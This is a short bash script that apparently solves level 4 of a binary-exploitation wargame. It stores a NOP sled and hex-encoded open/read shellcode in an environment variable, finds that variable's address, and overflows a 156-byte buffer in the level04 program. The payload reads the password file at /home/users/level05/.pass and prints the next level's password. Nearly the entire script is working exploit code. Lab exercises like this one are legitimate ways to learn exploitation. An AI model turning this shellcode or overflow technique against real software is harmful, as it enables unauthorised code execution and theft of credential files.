#!/bin/bash

function toLittleEndian {
    read address
    python -c "import struct; print struct.pack('<L', int('$address', 16))"
}

function buildExploit {
    NOPSLED="'\x90' * 0xff"
    OPEN_READ_SHELLCODE="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff"
    PASS_PATH="/home/users/level05/.pass"
    export SHELLCODE=`python -c "print $NOPSLED + '$OPEN_READ_SHELLCODE' + '$PASS_PATH'"`

    SHELLCODE_ADDR=`/tmp/getenv32 SHELLCODE ~/level04 | toLittleEndian`

    python -c "print 'A' * 156 + '$SHELLCODE_ADDR'" > /tmp/exploit04
}

set -x

buildExploit
NEXT_PASS=`cat /tmp/exploit04 | ~/level04 | head -1`

echo -e "\nNext pass is:  $NEXT_PASS"